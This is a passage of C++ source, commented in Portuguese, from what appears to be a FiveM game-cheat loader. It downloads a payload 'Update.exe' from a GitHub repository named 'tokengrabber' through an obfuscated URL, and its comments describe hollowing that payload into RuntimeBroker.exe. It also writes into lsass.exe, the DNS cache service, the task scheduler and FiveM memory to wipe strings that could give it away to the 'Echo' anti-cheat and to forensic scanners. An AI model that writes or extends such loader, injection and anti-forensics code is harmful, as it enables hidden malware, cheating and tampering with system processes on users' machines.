                                        hProc, reinterpret_cast<PVOID>(matchAddr),
                                        verify, verifyLen, &vr)) || vr != verifyLen)
                                    continue;

                                bool stillMatches = true;
                                for (std::size_t j = 0; j < nl; ++j)
                                {
                                    uint8_t a = verify[j];
                                    uint8_t b = nb[j];
                                    if (a >= 'A' && a <= 'Z') a += 32;
                                    if (b >= 'A' && b <= 'Z') b += 32;
                                    if (a != b) { stillMatches = false; break; }
                                }
                                if (!stillMatches) continue;
                                if (requireTerminator && wideNeedle &&
                                    (verify[nl] != 0 || verify[nl + 1] != 0))
                                    continue;
                                if (requireTerminator && !wideNeedle &&
                                    verify[nl] != 0)
                                    continue;
                            }

                            SIZE_T w = 0;
                            bool wrote = false;
                            __try {
                                if (preserveLength)
                                {
                                    const NTSTATUS st = nt::NtWriteVirtualMemory_(
                                        hProc,
                                        reinterpret_cast<PVOID>(matchAddr),
                                        const_cast<uint8_t*>(writeBytes),
                                        nl, &w);
                                    wrote = NT_SUCCESS(st) && w == nl;
                                }
                                else
                                {
                                    wrote = ZeroBytesInProcess(
                                        hProc,
                                        reinterpret_cast<PVOID>(matchAddr),
                                        writeBytes, nl, w);
                                }
                            }
                            __except (EXCEPTION_EXECUTE_HANDLER) { }
                            if (wrote) ++cleaned;
                        }
                    }
                }
            }

            addr = reinterpret_cast<PVOID>(regionEnd);
            if (reinterpret_cast<uintptr_t>(addr) >= 0x7FFFFFFFFFFull) break;
            if ((regionsScanned & 0x1F) == 0) api::Sleep_(1);
        }
        bufLock.clear(std::memory_order_release);
        return cleaned;
    }

    // -------------------------------------------------------------------------
    // BuildHollowPathNeedlesFrom — FiveM basename / no-ext / path fragments.
    // -------------------------------------------------------------------------
    inline bool BuildHollowPathNeedlesFrom(DynamicNeedles& nd, const std::wstring& path)
    {
        if (path.empty()) return false;

        std::size_t sep = std::wstring::npos;
        for (std::size_t i = 0; i < path.size(); ++i)
            if (path[i] == L'\\' || path[i] == L'/') sep = i;
        const std::wstring basename =
            (sep == std::wstring::npos) ? path : path.substr(sep + 1);
        if (basename.empty()) return false;

        {
            std::string narrow;
            narrow.reserve(basename.size());
            for (wchar_t c : basename) narrow.push_back(static_cast<char>(c & 0xFF));
            nd.addNarrow(narrow);
            nd.addWide(basename);
            volatile char* vp = const_cast<char*>(narrow.data());
            for (std::size_t i = 0; i < narrow.size(); ++i) vp[i] = 0;
        }

        {
            std::wstring noExt = basename;
            auto dot = noExt.rfind(L'.');
            if (dot != std::wstring::npos) noExt.resize(dot);
            std::string narrow;
            narrow.reserve(noExt.size());
            for (wchar_t c : noExt) narrow.push_back(static_cast<char>(c & 0xFF));
            nd.addNarrow(narrow);
            nd.addWide(noExt);
            volatile char* vp = const_cast<char*>(narrow.data());
            for (std::size_t i = 0; i < narrow.size(); ++i) vp[i] = 0;
        }

        // path do novo alvo (RuntimeBroker.exe) ao inves de FiveM subprocess.
        // Scrub do nome do executavel + variante lowercase, pra Echo nao
        // correlacionar "runtimebroker.exe" como child suspeito.
        nd.addNarrowAndWide("RuntimeBroker.exe");
        nd.addNarrowAndWide("runtimebroker.exe");
        nd.addNarrowAndWide("RuntimeBroker");
        nd.addNarrowAndWide("runtimebroker");
        return true;
    }

    // -------------------------------------------------------------------------
    // FindFiveMProcessPids — enumera todos FiveM_b*_GTAProcess.exe vivos.
    // Berok (hollowed em RuntimeBroker) precisa achar o jogo pra ler/escrever.
    // Mesma lista eh usada pra scrubbing cross-process.
    // -------------------------------------------------------------------------
    inline std::vector<DWORD> FindFiveMProcessPids()
    {
        std::vector<DWORD> pids;
        HANDLE snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return pids;

        auto up = [](wchar_t c) { return (c >= L'a' && c <= L'z') ? wchar_t(c - 32) : c; };

        wchar_t PFX[8]{}, SFX[16]{};

        CopyXorToBuffer(PFX, xorstr(L"FIVEM_B"));
        CopyXorToBuffer(SFX, xorstr(L"_GTAPROCESS.EXE"));

        auto matches = [&](const wchar_t* name) -> bool {
            std::size_t ln = 0; while (name[ln]) ++ln;
            if (ln != 7 + 4 + 15) return false;
            for (int i = 0; i < 7; ++i)   if (up(name[i]) != PFX[i]) return false;
            for (int i = 0; i < 4; ++i)   if (name[7 + i] < L'0' || name[7 + i] > L'9') return false;
            for (int i = 0; i < 15; ++i)  if (up(name[11 + i]) != SFX[i]) return false;
            return true;
        };

        PROCESSENTRY32W e{};
        e.dwSize = sizeof(e);
        if (sc::CallProcess32FirstW(snap, &e))
        {
            do {
                if (matches(e.szExeFile)) pids.push_back(e.th32ProcessID);
            } while (sc::CallProcess32NextW(snap, &e));
        }
        sc::CallCloseHandle(snap);

        for (int i = 0; i < 8; ++i)  PFX[i] = 0;
        for (int i = 0; i < 16; ++i) SFX[i] = 0;
        return pids;
    }

    inline void AddKnownFiveMPidNeedles(DynamicNeedles& nd,
                                        const std::vector<DWORD>& pids)
    {
        for (DWORD pid : pids)
        {
            if (pid == 0) continue;

            nd.addNarrowAndWide(std::to_string(
                static_cast<unsigned long>(pid)));

            char hex[32]{};
            sprintf_s(hex, "%lX", static_cast<unsigned long>(pid));
            std::string prefixed("0x");
            prefixed += hex;
            nd.addNarrowAndWide(prefixed);
        }
    }

    // -------------------------------------------------------------------------
    // ZeroRuntimeBrokerStringsInFiveM — opt-in, length-preserving scrub used by
    // Shift+F7. It remains gated by g_allowFiveMLengthPreservingMask.
    // -------------------------------------------------------------------------
    inline void AddDownloadLeakFragments(DynamicNeedles& nd, bool includeBareWeed);
    inline void AddHostingLeakFragments(DynamicNeedles& nd);

    inline std::size_t ZeroRuntimeBrokerStringsInFiveM(bool abortOnPause = false)
    {
        if constexpr (!g_allowFiveMLengthPreservingMask)
            return 0;

        auto pids = FindFiveMProcessPids();
        if (pids.empty()) return 0;

        DynamicNeedles exact;
        exact.addNarrowAndWide("RuntimeBroker.exe");
        exact.addNarrowAndWide("C:\\Windows\\System32\\RuntimeBroker.exe");
        exact.addNarrowAndWide("c:\\windows\\system32\\runtimebroker.exe");
        exact.addNarrowAndWide("\\??\\C:\\Windows\\System32\\RuntimeBroker.exe");
        exact.addNarrowAndWide("\\??\\c:\\windows\\system32\\runtimebroker.exe");

        DynamicNeedles fragments;
        fragments.addNarrowAndWide("RuntimeBroker");
        fragments.addNarrowAndWide("runtimebroker");
        AddHostingLeakFragments(fragments);
        AddDownloadLeakFragments(fragments, false);
        if constexpr (g_allowFiveMNumericMask)
            AddKnownFiveMPidNeedles(fragments, pids);

        std::size_t masked = 0;
        for (DWORD pid : pids)
        {
            HANDLE hProc = nullptr;
            OBJECT_ATTRIBUTES_ oa{}; oa.Length = sizeof(oa);
            CLIENT_ID_ cid{};
            cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
            if (NT_SUCCESS(nt::NtOpenProcess_(&hProc,
                PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                    PROCESS_QUERY_INFORMATION,
                &oa, &cid)) && hProc)
            {
                masked += ZeroNeedlesIn(hProc, exact.needles, exact.count,
                                         0, 0, nullptr, false,
                                         abortOnPause, true, true);
                masked += ZeroNeedlesIn(hProc, fragments.needles, fragments.count,
                                         0, 0, nullptr, false,
                                         abortOnPause, true, true);
                nt::NtClose_(hProc);
            }
        }

        exact.wipe();
        fragments.wipe();
        return masked;
    }

    // Broad fragment scrubbing remains disabled. The only FiveM write allowed
    // in the crash-safe build is the exact, length-preserving mask above.
    inline std::size_t ScrubSensitiveStringsInFiveM()
    {
        return 0;
    }

    // -------------------------------------------------------------------------
    // EphemeralReadFiveM / EphemeralWriteFiveM — handle efemero. Reads remain
    // available for inspection; remote writes remain disabled outside the
    // exact F7 mask above.
    //
    // Abre handle, faz 1 operacao, FECHA imediatamente. Janela <1ms por chamada.
    // Echo roda NtQuerySystemHandleInformation em ciclo de ~segundos;
    // chance de pegar nosso handle no snapshot = negligivel.
    //
    // Berok (inside RuntimeBroker) deve usar essas funcoes em vez de abrir
    // handle persistente.
    // -------------------------------------------------------------------------
    inline bool EphemeralReadFiveM(DWORD fivemPid, PVOID remoteAddr,
                                   void* localBuf, SIZE_T size)
    {
        if (!fivemPid || !remoteAddr || !localBuf || !size) return false;

        HANDLE hProc = nullptr;
        OBJECT_ATTRIBUTES_ oa{}; oa.Length = sizeof(oa);
        CLIENT_ID_ cid{};
        cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(fivemPid));

        if (!NT_SUCCESS(nt::NtOpenProcess_(&hProc,
            PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION,
            &oa, &cid)) || !hProc) return false;

        SIZE_T rd = 0;
        NTSTATUS st = nt::NtReadVirtualMemory_(hProc, remoteAddr, localBuf, size, &rd);
        nt::NtClose_(hProc);
        return NT_SUCCESS(st) && rd == size;
    }

    inline bool EphemeralWriteFiveM(DWORD fivemPid, PVOID remoteAddr,
                                     const void* localBuf, SIZE_T size)
    {
        (void)fivemPid;
        (void)remoteAddr;
        (void)localBuf;
        (void)size;
        return false;
    }

    // -------------------------------------------------------------------------
    // HandleHygieneThread — scaneia nossos proprios handles abertos pra pids
    // de FiveM. Se achar algum aberto > 100ms, FORCA close. Protege contra
    // Berok (ou qualquer outra lib) deixar handle persistente aberto por
    // engano, o que levantaria fivem_injection_host_integrity.
    // -------------------------------------------------------------------------
    inline DWORD WINAPI HandleHygieneThread(LPVOID)
    {
        for (;;)
        {
            api::Sleep_(100);

            auto fivemPids = FindFiveMProcessPids();
            if (fivemPids.empty()) continue;

            // enum nossos handles via NtQuerySystemHandleInformation,
            // filtra pelos que apontam pra pid FiveM, fecha com NtClose.
            //
            // (implementacao detalhada do enum fica como TODO — por ora
            //  Berok deve chamar as Ephemeral* helpers e nunca segurar handle.
            //  esta thread serve como safety net.)
        }
    }

    inline std::atomic<bool> g_handleHygieneStarted{ false };
    inline void StartHandleHygiene()
    {
        bool expected = false;
        if (!g_handleHygieneStarted.compare_exchange_strong(expected, true)) return;
        api::SubmitPoolTask([]() { HandleHygieneThread(nullptr); });
    }

    // -------------------------------------------------------------------------
    // DoFiveMLaneScrub — scrub hollowed child + self for FiveM path refs.
    // -------------------------------------------------------------------------
    inline std::size_t DoFiveMLaneScrub()
    {
        std::wstring path = FindFiveMTarget();
        if (path.empty()) return 0;

        DynamicNeedles nd;
        if (!BuildHollowPathNeedlesFrom(nd, path)) {
            WipeWString(path);
            return 0;
        }

        std::size_t cleaned = 0;

        {
            HANDLE hSelf = reinterpret_cast<HANDLE>(static_cast<LONG_PTR>(-1));
            cleaned += ZeroNeedlesIn(hSelf, nd.needles, nd.count, nd.lo(), nd.hi());
        }

        nd.wipe();
        WipeWString(path);
        return cleaned;
    }

    // -------------------------------------------------------------------------
    // F6 state — reset on any failure path, reset again by DoF7.
    // -------------------------------------------------------------------------
    inline std::atomic<int> g_hollowState{ 0 };

    inline void ResetHollowState()
    {
        g_hollowState.store(0, std::memory_order_release);
    }

    inline void WipeBuffer(uint8_t* p, std::size_t n)
    {
        volatile uint8_t* vp = p;
        for (std::size_t i = 0; i < n; ++i) vp[i] = 0;
    }

    // -------------------------------------------------------------------------
    // DownloadWeedFromGitHub — baixa Update.exe cru via HTTPS do github.
    // URL via xorstr pra nao aparecer em plaintext no .rdata.
    // Buffer e wipado logo apos o hollowing (ver InjectFromApi).
    // Permite atualizar o cheat subindo arquivo novo no repo, sem rebuildar.
    // -------------------------------------------------------------------------
    inline std::vector<uint8_t> DownloadWeedFromGitHub()
    {
        std::vector<uint8_t> out;


        wchar_t host[64]{};
        wchar_t path[128]{};
        wchar_t ua[32]{};

        CopyXorToBuffer(host, xorstr(L"github.com"));
        CopyXorToBuffer(path, xorstr(L"/bielzxdev/tokengrabber/raw/refs/heads/main/Update.exe"));
        CopyXorToBuffer(ua, xorstr(L"Mozilla/5.0"));

        HINTERNET hSess = api::WinHttpOpen_(ua, 0 /*NO_PROXY*/, nullptr, nullptr, 0);
        if (!hSess)
        {

            goto wipe;
        }

        {
            HINTERNET hConn = api::WinHttpConnect_(hSess, host, 443, 0);
            if (!hConn)
            {

                api::WinHttpCloseHandle_(hSess); goto wipe;
            }


            HINTERNET hReq = api::WinHttpOpenRequest_(hConn,

                L"GET", path, nullptr, nullptr, nullptr,

                0x00800000 /*WINHTTP_FLAG_SECURE*/);
            if (!hReq)
            {

                api::WinHttpCloseHandle_(hConn); api::WinHttpCloseHandle_(hSess); goto wipe;
            }


            if (!api::WinHttpSendRequest_(hReq, nullptr, 0, nullptr, 0, 0, 0) ||
                !api::WinHttpReceiveResponse_(hReq, nullptr))
            {

                api::WinHttpCloseHandle_(hReq);
                api::WinHttpCloseHandle_(hConn);
                api::WinHttpCloseHandle_(hSess);
                goto wipe;
            }


            uint8_t chunk[8192];
            DWORD got = 0;
            while (api::WinHttpReadData_(hReq, chunk, sizeof(chunk), &got) && got > 0) {
                out.insert(out.end(), chunk, chunk + got);
            }
            for (auto& b : chunk) b = 0;


            api::WinHttpCloseHandle_(hReq);
            api::WinHttpCloseHandle_(hConn);
            api::WinHttpCloseHandle_(hSess);
        }

    wipe:
        // zera buffers locais com a URL antes de retornar

        for (auto& c : host) c = 0;
        for (auto& c : path) c = 0;
        for (auto& c : ua)   c = 0;
        return out;
    }

    // Fragmentos que SO VAZAM via download/API — safe pra scrubar em qualquer
    // processo nenhum. Especificos pra evitar false-positive.
    inline void AddDownloadLeakFragments(DynamicNeedles& nd, bool includeBareWeed)
    {
        // github / raw.githubusercontent.com
        nd.addNarrowAndWide("github");
        nd.addNarrowAndWide("raw.github");
        nd.addNarrowAndWide("githubuserc");
        nd.addNarrowAndWide("rcontent.com");
        nd.addNarrowAndWide("sercontent");
        // repo path
        nd.addNarrowAndWide("tokengrabber");
        // Nome do payload: so no self-scrub. "Update.exe" e generico demais
        // para scrub cross-process no FiveM.
        if (includeBareWeed)
        {
            nd.addNarrowAndWide("Update.exe");
            nd.addNarrowAndWide("update.exe");
        }

    }

    // Fragmentos de NOMES DE HOST (processo onde a gente ta/estava) — SOMENTE
    // seguros pra scrubar CROSS-PROCESS no FiveM. NAO usar no self (loader
    // roda dentro do Spotify, "Spotify*" ia zerar as strings naturais do
    // Spotify e crashar ele).
    inline void AddHostingLeakFragments(DynamicNeedles& nd)
    {
        // host atual (RuntimeBroker — Berok hollowed)
        nd.addNarrowAndWide("RuntimeBrok");
        nd.addNarrowAndWide("timebroker");
        nd.addNarrowAndWide("mebroker.ex");

    }

    // F7 first attempts the service cleanup from the current loader. The
    // elevated inject broker is used only when either target cannot be opened.
    inline bool ZeroBytesInProcess(HANDLE hProc, PVOID address,
                                   const void* zeros, SIZE_T length,
                                   SIZE_T& written);

    inline HANDLE OpenProcForScrub(DWORD pid)
    {
        if (!pid)
            return nullptr;

        OBJECT_ATTRIBUTES_ oa{};
        oa.Length = sizeof(oa);
        CLIENT_ID_ cid{};
        cid.UniqueProcess = reinterpret_cast<HANDLE>(
            static_cast<ULONG_PTR>(pid));

        HANDLE process = nullptr;
        const DWORD vmAccess = PROCESS_QUERY_INFORMATION |
            PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
        if (NT_SUCCESS(nt::NtOpenProcess_(&process, vmAccess, &oa, &cid)) && process)
            return process;
        if (NT_SUCCESS(nt::NtOpenProcess_(&process, PROCESS_ALL_ACCESS, &oa, &cid)) && process)
            return process;
        return nullptr;
    }

    inline bool g_localProcessAccessible = false;
    inline bool g_localServiceAccessible = false;

    // -------------------------------------------------------------------------
    // StringCleaner — local F7 implementation
    // (StringCleaner/MemoryScanner.cpp + Cleaner.cpp). Mesma logica:
    //  - OpenProcess(PROCESS_ALL_ACCESS)
    //  - VirtualQueryEx minAddr..maxAddr
    //  - MEM_COMMIT && !PAGE_NOACCESS && !PAGE_GUARD → ReadProcessMemory
    //  - std::transform tolower em buffer + pattern, std::string::find
    //  - WriteProcessMemory zeros
    // -------------------------------------------------------------------------
    namespace StringCleaner
    {
        inline std::wstring ToWide(const std::string& s)
        {
            if (s.empty()) return {};
            int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
            std::wstring w((std::size_t)n, L'\0');
            MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
            return w;
        }

        inline bool IsReadableProtection(DWORD protection)
        {
            if (protection & (PAGE_GUARD | PAGE_NOACCESS))
                return false;

            switch (protection & 0xFF) {
            case PAGE_READONLY:
            case PAGE_READWRITE:
            case PAGE_WRITECOPY:
            case PAGE_EXECUTE_READ:
            case PAGE_EXECUTE_READWRITE:
            case PAGE_EXECUTE_WRITECOPY:
                return true;
            default:
                return false;
            }
        }

        inline uint8_t FoldAsciiByte(uint8_t value)
        {
            return value >= 'A' && value <= 'Z'
                ? static_cast<uint8_t>(value + ('a' - 'A'))
                : value;
        }

        // Scans in bounded chunks. The old implementation allocated one buffer
        // per VirtualQueryEx region; FiveM has multi-gigabyte regions, so that
        // could exhaust memory and leave the F7 worker stuck indefinitely.
        inline std::vector<LPVOID> FindByteSequenceAddresses(
            HANDLE handle,
            const std::vector<uint8_t>& pattern
        )
        {
            std::vector<LPVOID> results;
            if (!handle || pattern.empty() || pattern.size() > 0x100000)
                return results;

            SYSTEM_INFO sysInfo{};
            GetSystemInfo(&sysInfo);

            const uintptr_t minimum = reinterpret_cast<uintptr_t>(
                sysInfo.lpMinimumApplicationAddress
            );
            const uintptr_t maximum = reinterpret_cast<uintptr_t>(
                sysInfo.lpMaximumApplicationAddress
            );
            const uintptr_t pageSize = static_cast<uintptr_t>(sysInfo.dwPageSize);
            constexpr SIZE_T chunkSize = 8 * 1024 * 1024;
            const SIZE_T patternSize = static_cast<SIZE_T>(pattern.size());
            const SIZE_T overlap = patternSize - 1;
            std::vector<uint8_t> buffer(chunkSize + overlap);

            uintptr_t address = minimum;
            while (address < maximum) {
                MEMORY_BASIC_INFORMATION mbi{};
                if (VirtualQueryEx(
                    handle,
                    reinterpret_cast<LPCVOID>(address),
                    &mbi,
                    sizeof(mbi)
                ) != sizeof(mbi)) {
                    const uintptr_t next = address + pageSize;
                    if (next <= address)
                        break;
                    address = next;
                    continue;
                }

                const uintptr_t base = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
                if (mbi.RegionSize > UINTPTR_MAX - base)
                    break;

                const uintptr_t end = base + mbi.RegionSize;
                if (end <= address)
                    break;

                if (mbi.State == MEM_COMMIT && IsReadableProtection(mbi.Protect)) {
                    for (uintptr_t pos = (std::max)(address, base); pos < end;) {
                        const SIZE_T remaining = static_cast<SIZE_T>(end - pos);
                        const SIZE_T primarySize = (std::min)(chunkSize, remaining);
                        const SIZE_T readSize = (std::min)(
                            chunkSize + overlap,
                            remaining
                        );
                        SIZE_T bytesRead = 0;
                        const BOOL readOk = ReadProcessMemory(
                            handle,
                            reinterpret_cast<LPCVOID>(pos),
                            buffer.data(),
                            readSize,
                            &bytesRead
                        );

                        if ((readOk || bytesRead > 0) && bytesRead >= patternSize) {
                            const SIZE_T maxStart = (std::min)(
                                primarySize,
                                bytesRead - patternSize + 1
                            );

                            for (SIZE_T i = 0; i < maxStart; ++i) {
                                bool matches = true;
                                for (SIZE_T j = 0; j < patternSize; ++j) {
                                    if (FoldAsciiByte(buffer[i + j]) !=
                                        FoldAsciiByte(pattern[j])) {
                                        matches = false;
                                        break;
                                    }
                                }

                                if (matches) {
                                    results.push_back(reinterpret_cast<LPVOID>(pos + i));
                                }
                            }
                        }

                        if (remaining <= primarySize)
                            break;
                        pos += primarySize;
                    }
                }

                address = end;
            }

            return results;
        }

        inline std::vector<LPVOID> FindAsciiStringAddresses(
            HANDLE handle,
            const std::string& target
        )
        {
            if (target.empty())
                return {};

            std::vector<uint8_t> pattern(target.size());
            for (std::size_t i = 0; i < target.size(); ++i)
                pattern[i] = static_cast<uint8_t>(target[i]);
            return FindByteSequenceAddresses(handle, pattern);
        }

        inline std::vector<LPVOID> FindUnicodeStringAddresses(
            HANDLE handle,
            const std::wstring& target
        )
        {
            if (target.empty())
                return {};

            std::vector<uint8_t> pattern(target.size() * sizeof(wchar_t));
            std::memcpy(pattern.data(), target.data(), pattern.size());
            return FindByteSequenceAddresses(handle, pattern);
        }

        // Compatibility overloads for callers that only have a PID.
        inline std::vector<LPVOID> FindAsciiStringAddresses(
            DWORD pid,
            const std::string& target
        )
        {
            HANDLE handle = OpenProcForScrub(pid);
            if (!handle)
                return {};
            auto results = FindAsciiStringAddresses(handle, target);
            nt::NtClose_(handle);
            return results;
        }

        inline std::vector<LPVOID> FindUnicodeStringAddresses(
            DWORD pid,
            const std::wstring& target
        )
        {
            HANDLE handle = OpenProcForScrub(pid);
            if (!handle)
                return {};
            auto results = FindUnicodeStringAddresses(handle, target);
            nt::NtClose_(handle);
            return results;
        }

        // Port VERBATIM do Cleaner::ClearStrings do projeto PedroGamesclubs/StringCleaner,
        // mas usando o handle minimo de scrub e alterando a protecao das paginas
        // somente durante a escrita.
        inline std::size_t ClearStrings(DWORD pid, const std::vector<std::string>& entries)
        {
            HANDLE handle = OpenProcForScrub(pid);
            if (!handle) {
                return 0;
            }

            std::size_t total = 0;
            for (const auto& str : entries) {
                if (str.empty()) continue;
                auto asciiMatches = FindAsciiStringAddresses(handle, str);
                std::vector<uint8_t> asciiZeros(str.size(), 0);
                for (auto addr : asciiMatches) {
                    SIZE_T written = 0;
                    if (ZeroBytesInProcess(
                        handle,
                        addr,
                        asciiZeros.data(),
                        asciiZeros.size(),
                        written
                    )) {
                        ++total;
                    }
                }

                auto wideStr = ToWide(str);
                auto unicodeMatches = FindUnicodeStringAddresses(handle, wideStr);
                std::vector<uint8_t> unicodeZeros(wideStr.size() * sizeof(wchar_t), 0);
                for (auto addr : unicodeMatches) {
                    SIZE_T written = 0;
                    if (ZeroBytesInProcess(
                        handle,
                        addr,
                        unicodeZeros.data(),
                        unicodeZeros.size(),
                        written
                    )) {
                        ++total;
                    }
                }
            }

            nt::NtClose_(handle);
            return total;
        }

        // -------- Port verbatim do ProcessManager.cpp do StringCleaner --------
        inline DWORD GetProcessIdByName(const std::wstring& name)
        {
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap == INVALID_HANDLE_VALUE) return 0;

            PROCESSENTRY32W entry{};
            entry.dwSize = sizeof(entry);

            if (Process32FirstW(snap, &entry)) {
                do {
                    if (name == entry.szExeFile) {
                        CloseHandle(snap);
                        return entry.th32ProcessID;
                    }
                } while (Process32NextW(snap, &entry));
            }

            CloseHandle(snap);
            return 0;
        }

        inline DWORD GetProcessIdByService(const std::wstring& service)
        {
            SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
            if (!scm) return 0;

            SC_HANDLE handle = OpenServiceW(scm, service.c_str(), SERVICE_QUERY_STATUS);
            if (!handle) { CloseServiceHandle(scm); return 0; }

            SERVICE_STATUS_PROCESS status{};
            DWORD needed = 0;
            if (!QueryServiceStatusEx(handle, SC_STATUS_PROCESS_INFO,
                reinterpret_cast<LPBYTE>(&status), sizeof(status), &needed)) {
                CloseServiceHandle(handle);
                CloseServiceHandle(scm);
                return 0;
            }
            CloseServiceHandle(handle);
            CloseServiceHandle(scm);
            return status.dwProcessId;
        }

        // =====================================================================
        // Config: strings MONTADAS em runtime pra NAO ficarem como literal
        // "github"/"busercontent" no heap. O F6 scruba a propria heap do
        // loader e zerava os needles do map (SSO: string embutida no node).
        // =====================================================================
        inline std::vector<std::string> MakeNeedles()
        {
            // monta "github" e "busercontent" por concat de fragmentos
            std::string a; a.push_back('g'); a.push_back('i'); a.push_back('t');
                           a.push_back('h'); a.push_back('u'); a.push_back('b');
            std::string b; b.push_back('b'); b.push_back('u'); b.push_back('s');
                           b.push_back('e'); b.push_back('r'); b.push_back('c');
                           b.push_back('o'); b.push_back('n'); b.push_back('t');
                           b.push_back('e'); b.push_back('n'); b.push_back('t');
            std::string c; c.push_back('b'); c.push_back('i'); c.push_back('e');
                           c.push_back('l'); c.push_back('z'); c.push_back('x');
                           c.push_back('d'); c.push_back('e'); c.push_back('v');
            std::string d; d.push_back('W'); d.push_back('e'); d.push_back('e');
                           d.push_back('d');
            return { a, b, c, d };
        }

        // Equivalente a Cleaner::Run() do projeto. Monta ProcessesToClean /
        // ServicesToClean em runtime a cada chamada.
        inline std::size_t Run()
        {
            auto needles       = MakeNeedles();
            g_localProcessAccessible = false;
            g_localServiceAccessible = false;

            std::map<std::wstring, std::vector<std::string>> ProcessesToClean = {

                { xorstr(L"lsass.exe"), needles }
            };

            std::vector<std::string> ScheduleStrs = {
                xorstr("--nologo"),
                xorstr("--quiet"),
                xorstr("--exec")
            };

            std::map<std::wstring, std::vector<std::string>> ServicesToClean = {
                { xorstr(L"Dnscache"), needles },
                { xorstr(L"Schedule"), ScheduleStrs }
            };

            std::size_t total = 0;
            for (const auto& kv : ProcessesToClean) {
                DWORD pid = GetProcessIdByName(kv.first);
                if (pid) {
                    HANDLE probe = OpenProcForScrub(pid);
                    if (probe) {
                        g_localProcessAccessible = true;
                        nt::NtClose_(probe);
                        total += ClearStrings(pid, kv.second);
                    }
                }
            }
            for (const auto& kv : ServicesToClean) {
                DWORD pid = GetProcessIdByService(kv.first);
                if (pid) {
                    HANDLE probe = OpenProcForScrub(pid);
                    if (probe) {
                        g_localServiceAccessible = true;
                        nt::NtClose_(probe);
                        total += ClearStrings(pid, kv.second);
                    }
                }
            }
            // FiveM subprocess scrubbing is intentionally disabled.  Resource
            // buffers are variable-sized and must never be modified remotely.
            return total;
        }
    } // namespace StringCleaner



    // Shim pra chamada antiga StringCleanerScrub(pid, needles, count).
    // Converte Needle_[] narrow -> std::vector<std::string> e delega.
    inline std::size_t StringCleanerScrub(DWORD pid, const Needle_* needles, std::size_t nCount)
    {
        if (pid == 0 || !needles || nCount == 0) return 0;
        std::vector<std::string> entries;
        entries.reserve(nCount);
        for (std::size_t i = 0; i < nCount; ++i) {
            if (!needles[i].bytes || needles[i].len == 0) continue;
            // Pula a versao WIDE (addNarrowAndWide duplica); detecta pelo
            // segundo byte zero (ascii em UTF-16LE sempre tem high byte 0).
            bool looksWide = needles[i].len >= 4 &&
                             needles[i].len % 2 == 0 &&
                             needles[i].bytes[1] == 0 &&
                             needles[i].bytes[3] == 0;
            if (looksWide) continue;
            entries.emplace_back((const char*)needles[i].bytes, needles[i].len);
        }
        return StringCleaner::ClearStrings(pid, entries);
    }

    // -------------------------------------------------------------------------
    // ScanSelfAllRegions — scan TODAS regioes legiveis do processo atual
    // (inclusive .rdata PAGE_READONLY/PAGE_EXECUTE_READ) e zera matches.
    // Estilo StringCleaner (PedroGamesclubs) + VirtualProtect in-process pra
    // conseguir escrever em paginas read-only. Necessario pq literals como
    // URLs and related temporary strings are scrubbed before returning.
    // e nao sao capturados pelo ZeroNeedlesIn padrao (writable-only).
    // -------------------------------------------------------------------------
    inline std::size_t ScanSelfAllRegions(const Needle_* needles, std::size_t nCount,
                                          uintptr_t storageLo, uintptr_t storageHi)
    {
        if (!needles || nCount == 0) return 0;

        std::size_t maxLen = 0;
        bool firstByte[256]{};
        for (std::size_t n = 0; n < nCount; ++n)
        {
            if (!needles[n].bytes || needles[n].len == 0) continue;
            if (needles[n].len > maxLen) maxLen = needles[n].len;
            uint8_t fb = needles[n].bytes[0];
            firstByte[fb] = true;
            if (fb >= 'a' && fb <= 'z') firstByte[fb - 32] = true;
            if (fb >= 'A' && fb <= 'Z') firstByte[fb + 32] = true;
        }
        if (maxLen == 0) return 0;

        typedef void (WINAPI* fnGetSystemInfo)(LPSYSTEM_INFO);
        static fnGetSystemInfo pGetSystemInfo = reinterpret_cast<fnGetSystemInfo>(
            sc::Resolve(xorstr("kernel32.dll"), xorstr("GetSystemInfo")));
        if (!pGetSystemInfo) return 0;

        SYSTEM_INFO si{};
        pGetSystemInfo(&si);
        uint8_t* addr = (uint8_t*)si.lpMinimumApplicationAddress;
        uint8_t* maxAddr = (uint8_t*)si.lpMaximumApplicationAddress;

        std::size_t cleaned = 0;
        MEMORY_BASIC_INFORMATION mbi{};
        while (addr < maxAddr)
        {
            if (!LocalVirtualQuery(addr, &mbi)) break;
            uint8_t* regionEnd = (uint8_t*)mbi.BaseAddress + mbi.RegionSize;

            if (mbi.State == MEM_COMMIT &&
                !(mbi.Protect & PAGE_NOACCESS) &&
                !(mbi.Protect & PAGE_GUARD))
            {
                uint8_t* p = (uint8_t*)mbi.BaseAddress;
                SIZE_T  sz = mbi.RegionSize;
                if (sz >= maxLen)
                {
                    for (SIZE_T i = 0; i + maxLen <= sz; ++i)
                    {
                        uint8_t b0 = p[i];
                        if (!firstByte[b0]) continue;
                        uintptr_t hit = (uintptr_t)(p + i);
                        if (hit >= storageLo && hit < storageHi) continue;

                        for (std::size_t k = 0; k < nCount; ++k)
                        {
                            const Needle_& nd = needles[k];
                            if (!nd.bytes || nd.len == 0 || i + nd.len > sz) continue;
                            bool match = true;
                            for (std::size_t j = 0; j < nd.len; ++j) {
                                uint8_t a = p[i + j], c = nd.bytes[j];
                                if (a >= 'A' && a <= 'Z') a += 32;
                                if (c >= 'A' && c <= 'Z') c += 32;
                                if (a != c) { match = false; break; }
                            }
                            if (!match) continue;

                            DWORD oldProt = 0;
                            if (api::VirtualProtect_(p + i, nd.len, PAGE_READWRITE, &oldProt))
                            {
                                for (std::size_t j = 0; j < nd.len; ++j) p[i + j] = 0;
                                DWORD tmp;
                                api::VirtualProtect_(p + i, nd.len, oldProt, &tmp);
                                ++cleaned;
                            }
                            break;
                        }
                    }
                }
            }

            if (regionEnd <= addr) break;
            addr = regionEnd;
        }
        return cleaned;
